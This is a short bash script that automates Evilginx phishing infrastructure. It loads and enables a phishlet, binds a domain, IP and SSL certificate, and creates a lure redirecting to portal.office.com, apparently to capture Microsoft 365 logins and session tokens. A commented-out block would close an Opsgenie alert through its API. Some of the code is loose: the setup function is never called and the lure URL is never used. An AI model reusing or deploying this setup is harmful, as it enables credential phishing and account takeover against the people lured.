#!/bin/bash
setup_evilginx() {
    echo "Setting up Evilginx for domain: $domain_name"

    # Load the phishlet
    sudo evilginx phishlets upload "$phishlet_path"

    # Enable the phishlet
    sudo evilginx phishlets enable example

    # Set up the hostname (domain or subdomain)
    sudo evilginx config domain "$subdomain"

    # Bind to the IP address
    sudo evilginx config ip "$host_ip"

    # Set up SSL using the provided certificate and key
    sudo evilginx config sslkey "$ssl_key_path"
    sudo evilginx config sslcert "$ssl_crt_path"
}

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    # Create the lure
    sudo evilginx lures create "$phishlet"

    # Get the generated URL (Assuming the command outputs it)
    local lure_url
    lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")

    # Set the redirect URL
    sudo evilginx lures redirect "$phishlet" "$redirect_url"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")

# Automate multiple lure creation
create_lure $default_phishlet $domain_name "https://portal.office.com"

# # Define your Opsgenie API key
# API_KEY="YOUR_OPSGENIE_API_KEY"


# # Define the Opsgenie API endpoint for updating alerts
# ALERT_ID="f47c229b-1234-5678-910a-bcdefghijklmn"  # Replace with actual alert ID
# API_URL="https://api.opsgenie.com/v2/alerts/$ALERT_ID/close"

# # Send the request to close the alert
# response=$(curl -s -X POST "$API_URL" \
#   -H "Authorization: GenieKey $API_KEY" \
#   -H "Content-Type: application/json" \
#   -d '{
#         "user": "user@example.com",
#         "note": "Closing the alert from Bash"
#       }')

# # Output the response from the API
# echo "Response: $response"
